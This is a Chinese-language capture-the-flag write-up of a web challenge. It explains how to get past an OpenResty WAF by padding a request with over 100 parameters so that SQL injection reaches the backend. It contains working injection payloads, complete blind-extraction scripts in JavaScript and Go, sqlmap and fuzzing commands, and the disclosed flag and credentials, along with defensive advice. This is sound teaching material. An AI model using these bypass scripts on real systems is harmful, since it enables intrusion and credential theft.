# NovruzCTF 2026 - Novruz 2196 Writeup

## 题目信息

- **比赛**: NovruzCTF 2026
- **题目**: You won't get into novruz in 2196 if you don't solve this task.
- **类型**: Web
- **地址**: `http://95.111.234.103:10007/`
- **Flag格式**: `novruzctf{}`
- **状态**: 已解

## Flag

```text
novruzctf{someL0ngPasswordYouShouldNev3rGuess}
```

## 解题过程

### 1. 信息收集

访问目标页面，是一个简单的 HTML 登录表单：

```html
<h3>Login</h3>
<form method="post" action="login.php">
    <input type="text" name="name">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

**服务端指纹**：
| 项目 | 值 |
|------|-----|
| Web 服务器 | OpenResty 1.21.4.2 (基于 Nginx + Lua) |
| 后端语言 | PHP 7.4.33 |
| 数据库 | SQLite 3.36.0 |

`login.php` POST 返回两种响应：
- 成功登录 → `302 Found`，重定向 `/admin`
- 失败 → `401 Unauthorized`，`Invalid credentials.`
- 缺少参数 → `412`，`Missing name or password.`

### 2. WAF 行为分析

尝试 SQL 注入时发现 OpenResty WAF 非常严格，直接返回 `403 Forbidden`。

通过逐字符测试，确定 WAF 在 POST body 中的过滤规则：

| 被拦截的字符/模式 | 说明 |
|------------------|------|
| `'` (单引号) | 任何位置出现即拦截 |
| `"` (双引号) | 同上 |
| `` ` `` (反引号) | 同上 |
| `(` `)` | 括号 |
| `*` `!` `~` `%` | 特殊字符 |
| `\|\|` `&&` | 逻辑运算符 |
| `--` `#` `%00` | SQL 注释 / 空字节 |
| `OR {num}` `AND {cond}` | SQL 关键字组合 |
| `UNION SELECT` | 联合查询 |
| `LIKE` `NOT` `REGEXP` `XOR` | SQL 操作符 |

**允许通过的字符**：`\` `;` `,` `@` `+` `/` `<` `>` `=` `^`

### 3. 常规绕过尝试（均失败）

| 技术 | 结果 |
|------|------|
| URL 双重编码 (`%2527`) | `%25` 被拦截 |
| 宽字节注入 (`%bf%27`) | 仍被拦截 |
| UTF-7 编码 (`+ACc-`) | 被拦截 |
| Overlong UTF-8 (`%c0%a7`) | 被拦截 |
| Content-Type 变换 | PHP 只接受精确的 `application/x-www-form-urlencoded` |
| Chunked 传输编码 | WAF 正确重组 chunks 后检测 |
| HTTP 请求走私 (CL.TE / TE.CL) | OpenResty 拒绝冲突头部 (400) |
| HTTP 参数污染 | WAF 检测重复参数名并拦截 |
| HTTP Pipelining | WAF 独立检测每个请求 |
| Content-Length 不匹配 | WAF 和 PHP 都只读 CL 指定的字节数 |
| 大量 padding 溢出 | WAF 检查完整 body |

### 4. 关键突破：`ngx.req.get_post_args()` 参数上限绕过

OpenResty 的 Lua WAF 使用 `ngx.req.get_post_args()` 解析 POST 参数进行安全检查。该函数有一个**默认最大参数数量限制：100 个**。

当 POST body 中包含超过 100 个参数时，WAF 只解析前 100 个参数并忽略其余参数。但 **PHP 的 `$_POST` 没有这个限制**（默认 `max_input_vars=1000`），会解析全部参数。

**绕过方法**：发送 100 个垃圾参数 + 注入 payload

```text
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

p0=x&p1=x&p2=x&...&p99=x&name=admin' OR 1=1-- &password=x
```

- WAF 的 `get_post_args()` 解析到第 100 个参数 `p99=x` 后停止，不会看到 `name` 参数中的 `'` 和 SQL 注入
- PHP 的 `$_POST` 解析全部 102 个参数，包括含注入的 `name`

**验证**：

```javascript
// 构造 payload
let parts = [];
for (let i = 0; i < 100; i++) parts.push('p' + i + '=x');
parts.push("name=admin' OR 1=1-- ");
parts.push('password=x');
const body = parts.join('&');
// POST → 302 Found (登录成功!)
```

### 5. 确认数据库类型

通过 UNION SELECT 测试各数据库特有函数，确定后端为 **SQLite**：

| 测试 | MySQL | SQLite | 实际结果 |
|------|-------|--------|---------|
| `version()` | 返回版本 | 不存在 → 错误 | 401 (错误) |
| `@@version` | 返回版本 | 不存在 → 错误 | 401 (错误) |
| `sqlite_version()` | 不存在 | 返回版本 | **302 (成功)** |
| `SUBSTR()` | 支持 | 支持 | 302 (成功) |
| `MID()` | 支持 | 不存在 | 401 (错误) |

确认列数为 **2 列**（`UNION SELECT 1,2` 成功，其他列数失败）。

### 6. SQLite 盲注提取数据

由于认证后的页面不显示查询结果（body 为空），使用 **布尔盲注** 逐字符提取数据。

**布尔条件**：
- 条件为真 → UNION 返回有效行 → 登录成功 (302)
- 条件为假 → UNION 返回 NULL → 登录失败 (401)

```sql
' UNION SELECT CASE WHEN ({condition}) THEN 1 ELSE null END, 2--
```

**二分搜索加速**：对每个字符用 `unicode(substr(...)) > mid` 做二分查找，每个字符只需 ~7 次请求。

#### 6.1 提取表结构

```text
sqlite_master → 1 个表: users
CREATE TABLE users (name VARCHAR(200), password VARCHAR(200))
```

数据库路径：`/sql.db`

#### 6.2 提取用户数据

| 行 | name | password |
|----|------|----------|
| 1 | admin | someL0ngPasswordYouShouldNev3rGuess |
| 2 | admin | a |

### 7. 用真实凭据登录验证

```bash
curl -X POST http://95.111.234.103:10007/login.php \
  -d "name=admin&password=someL0ngPasswordYouShouldNev3rGuess"
# → 302 Found, Location: /admin
```

## 漏洞/知识点分析

### 1. OpenResty WAF `get_post_args()` 参数上限绕过

这是本题的核心漏洞。

OpenResty 的 `ngx.req.get_post_args()` 默认 `max_args = 100`。当 POST body 中参数数量超过 100 时，多余的参数**被静默丢弃**，不会触发错误。WAF 基于这个 API 获取参数进行检查，因此无法看到第 101 个及之后的参数。

而 PHP 的 `$_POST` 解析器独立运行，默认 `max_input_vars = 1000`，可以解析远超 100 个的参数。

```text
            OpenResty WAF                    PHP-FPM
                 │                              │
    get_post_args(max_args=100)         $_POST(max_input_vars=1000)
                 │                              │
         只看前 100 个参数              解析全部 102 个参数
                 │                              │
          p0~p99 (全部干净)            p0~p99 + name(注入) + password
                 │                              │
             ✅ 放行                        💉 SQL 注入执行
```

**防御建议**：
- 显式设置 `ngx.req.get_post_args(0)` 解除参数上限
- WAF 应同时检查原始 body 字符串，不仅依赖参数解析
- 使用参数化查询（PreparedStatement）从根本上防止 SQL 注入

### 2. SQLite 盲注

标准的布尔盲注技术，利用 `CASE WHEN ... THEN ... ELSE null END` 控制 UNION 查询的返回值，通过 HTTP 状态码 (302 vs 401) 区分真假。

**关键 SQLite 特性**：
- `sqlite_master` 存储所有表的 schema
- `pragma_database_list` 可获取数据库文件路径
- `unicode()` + `substr()` 实现逐字符提取

## 知识点
- **OpenResty 参数解析上限** — `get_post_args()` 默认 max_args=100
- **WAF 与后端解析差异** — 安全检查与业务解析不一致导致绕过
- **SQLite 盲注** — `unicode(substr())` + 二分搜索提取字符串

## 自动化盲注脚本

```javascript
// Node.js 盲注脚本核心逻辑
function buildPayload(condition) {
  let parts = [];
  for (let i = 0; i < 100; i++) parts.push('p' + i + '=x');
  const injection = "' UNION SELECT CASE WHEN (" + condition
    + ") THEN 1 ELSE null END, 2-- ";
  parts.push('name=' + encodeURIComponent(injection));
  parts.push('password=x');
  return parts.join('&');
}

async function extractString(subquery, maxLen) {
  let result = '';
  for (let pos = 1; pos <= maxLen; pos++) {
    // 检查字符是否存在
    if (!await test(`length(${subquery}) >= ${pos}`)) break;
    // 二分搜索字符值
    let lo = 32, hi = 126;
    while (lo < hi) {
      const mid = Math.floor((lo + hi) / 2);
      if (await test(`unicode(substr(${subquery},${pos},1)) > ${mid}`))
        lo = mid + 1;
      else
        hi = mid;
    }
    result += String.fromCharCode(lo);
  }
  return result;
}
```

### Go 版本盲注脚本（核心逻辑）

```go
package main

import (
    "bytes"
    "fmt"
    "io"
    "net/http"
    "net/url"
)

const target = "http://95.111.234.103:10007/login.php"

func buildPayload(cond string) string {
    vals := url.Values{}
    for i := 0; i < 100; i++ {
        vals.Set(fmt.Sprintf("p%d", i), "x")
    }
    injection := "' UNION SELECT CASE WHEN (" + cond + ") THEN 1 ELSE null END, 2-- "
    vals.Set("name", injection)
    vals.Set("password", "x")
    return vals.Encode()
}

func testCond(cond string) bool {
    body := buildPayload(cond)
    req, _ := http.NewRequest("POST", target, bytes.NewBufferString(body))
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    io.ReadAll(resp.Body)
    return resp.StatusCode == 302
}

func extractString(expr string, maxLen int) string {
    out := ""
    for pos := 1; pos <= maxLen; pos++ {
        if !testCond(fmt.Sprintf("length(%s) >= %d", expr, pos)) {
            break
        }
        lo, hi := 32, 126
        for lo < hi {
            mid := (lo + hi) / 2
            cond := fmt.Sprintf("unicode(substr(%s,%d,1)) > %d", expr, pos, mid)
            if testCond(cond) {
                lo = mid + 1
            } else {
                hi = mid
            }
        }
        out += string(rune(lo))
    }
    return out
}

func main() {
    flag := extractString("(select password from users limit 1)", 64)
    fmt.Println(flag)
}
```

## 使用的工具

| 工具 | 用途 |
|------|------|
| curl | HTTP 请求、WAF 行为分析 |
| Node.js (http/net) | 自动化盲注脚本、原始 TCP 请求 |
| /dev/tcp | 端口扫描、原始 HTTP 请求 |

## 脚本归档
- Go：[`novruzCTF_Novruz2196_WAFBypass.go` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_go/novruzCTF_Novruz2196_WAFBypass.go){target="_blank"}
- Python：[`novruzCTF_Novruz2196_WAFBypass.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/novruzCTF_Novruz2196_WAFBypass.py){target="_blank"}

## 命令行提取关键数据（无 GUI）

```bash
# 构造 100 个参数 + 注入 payload（绕过 WAF）
python3 - <<'PY'
params = [f"p{i}=x" for i in range(100)]
params.append("name=admin' OR 1=1-- ")
params.append("password=x")
print("&".join(params))
PY

# 提交请求（若成功会返回 302）
# curl -i -X POST http://95.111.234.103:10007/login.php -d "<上面的payload>"
```

## 推荐工具与优化解题流程

> 参考 `CTF_TOOLS_EXTENSION_PLAN.md` 中的 Web 工具推荐。本题的核心难点是 WAF 绕过。

### 1. Burp Suite — WAF 规则分析与绕过（推荐首选）

[Burp Suite](https://portswigger.net/burp) 的 Repeater 和 Intruder 是分析 WAF 行为的最佳工具。

**详细操作步骤：**

**Step 1：Repeater 系统化测试 WAF 规则**
1. 将登录请求发送到 Repeater
2. 逐字符/逐关键字修改 `name` 参数，记录 WAF 的反应：
   - `name=admin'` → 403（`'` 被拦截）
   - `name=admin"` → 403（`"` 被拦截）
   - `name=admin;` → 200（`;` 允许）
3. 建立完整的 WAF 黑名单列表

**Step 2：Intruder 自动化 WAF 字符测试**
1. Send to Intruder
2. Payload 位置：`name=admin§x§`
3. Payload 列表：所有可打印 ASCII 字符 + SQL 关键字
4. 根据响应状态码（200 vs 403）自动分类
5. 一次扫描即可得到完整的过滤规则表

**Step 3：参数数量绕过测试**
1. 在 Repeater 中手动添加大量垃圾参数
2. 或使用 Intruder 的 "Battering Ram" 模式，自动增加参数数量
3. 观察从多少个参数开始 WAF 不再检查后续参数

**Step 4：盲注自动化**
1. 确认绕过方法后，使用 Intruder 进行盲注
2. 配置 Grep-Match 规则区分真/假（302 vs 401）
3. 逐位提取数据

**优势**：Intruder 可系统化 fuzz WAF 规则，比手动逐个测试快 10 倍。

---

### 2. SQLMap — WAF 绕过 + SQL 注入自动化

SQLMap 内置多种 WAF 绕过技术和 tamper 脚本。

**详细操作步骤：**

**Step 1：基础检测（可能被 WAF 拦截）**
```bash
sqlmap -u "http://95.111.234.103:10007/login.php" \
  --data="name=admin&password=test" \
  -p name \
  --dbms=sqlite
# 大概率被 WAF 拦截 → 403
```

**Step 2：配合参数溢出绕过 WAF**

SQLMap 支持自定义 tamper 脚本。编写一个 tamper 在请求中注入 100 个垃圾参数：

```python
# tamper/param_overflow.py
def tamper(payload, **kwargs):
    """在 payload 前添加 100 个垃圾参数绕过 OpenResty WAF"""
    return payload

def dependencies():
    pass
```

但更好的方法是使用 `--prefix` 配合自定义请求格式：

```bash
# 使用 --eval 在每次请求中注入垃圾参数
sqlmap -u "http://95.111.234.103:10007/login.php" \
  --data="$(python3 -c 'print("&".join(f"p{i}=x" for i in range(100)))')&name=admin&password=test" \
  -p name \
  --dbms=sqlite \
  --technique=U \
  --union-cols=2 \
  --no-cast
```

**Step 3：SQLMap 自定义请求文件**
```bash
# 将包含 100 个垃圾参数的请求保存为文件
cat > request.txt << 'EOF'
POST /login.php HTTP/1.1
Host: 95.111.234.103:10007
Content-Type: application/x-www-form-urlencoded

p0=x&p1=x&...&p99=x&name=*&password=test
EOF

sqlmap -r request.txt --dbms=sqlite --technique=BU
```

**优势**：SQLMap 的 UNION 注入 + 布尔盲注可以自动完成数据提取，无需手写二分搜索脚本。

---

### 3. ffuf — WAF 规则 Fuzzing

```bash
# 测试哪些字符/关键字被 WAF 拦截
ffuf -u "http://95.111.234.103:10007/login.php" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=adminFUZZ&password=test" \
  -w sql-chars.txt \
  -mc 200,302,401 -fc 403

# sql-chars.txt 包含: ', ", `, (, ), --, #, OR, AND, UNION, SELECT 等
```

**优势**：快速枚举 WAF 黑名单。

---

### 4. wfuzz — 参数溢出测试

[wfuzz](https://github.com/xmendez/wfuzz) 适合测试参数数量阈值。

```bash
# 测试不同数量的填充参数
for n in 50 80 90 95 99 100 101 105; do
  padding=$(python3 -c "print('&'.join(f'p{i}=x' for i in range($n)))")
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    "http://95.111.234.103:10007/login.php" \
    -d "${padding}&name=admin'+OR+1=1--+&password=test")
  echo "Params=$n → HTTP $resp"
done
# 找到 WAF 的参数数量阈值：100
```

---

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 |
|------|---------|---------|------|
| **Burp Intruder** | WAF 规则分析 | ~5 分钟 | 系统化 fuzz 字符和关键字 |
| **SQLMap** | SQL 注入自动化 | ~10 分钟 | 配合参数溢出绕过后可自动提取数据 |
| **ffuf** | WAF 黑名单枚举 | ~2 分钟 | 高速字符/关键字 fuzz |
| **Node.js 脚本** | 盲注提取 | ~5 分钟 | 灵活定制二分搜索 |
| **curl 手动** | 逐个测试 | ~30 分钟 | 准确但极其耗时 |

**推荐流程**：Burp Intruder / ffuf 系统化 fuzz WAF 规则 → 发现 100 参数阈值 → SQLMap + 参数溢出 tamper 自动提取数据 → 总计约 15 分钟（对比手动测试 30+ 种绕过技术的数小时）。

## 解题流程图

```text
访问登录页面 → 尝试 SQL 注入 → 403 Forbidden (WAF 拦截)
    │
    ▼
逐字符测试 WAF 规则：' " ` ( ) * # -- 等均被拦截
    │
    ▼
尝试 30+ 种绕过技术均失败（编码、走私、Content-Type、HPP...）
    │
    ▼
关键发现：发送 100+ 个参数后，WAF 不再检查后续参数
    │
    ▼
原理：ngx.req.get_post_args() 默认 max_args=100
      超出部分被 WAF 静默丢弃，但 PHP $_POST 正常解析
    │
    ▼
构造 Payload：100 个垃圾参数 + SQL 注入参数
    │
    ▼
UNION SELECT 列数枚举 → 2 列
    │
    ▼
sqlite_version() 成功 → 确认 SQLite 数据库
    │
    ▼
布尔盲注 + 二分搜索 → 提取表结构和用户数据
    │
    ▼
admin:someL0ngPasswordYouShouldNev3rGuess → Flag
```
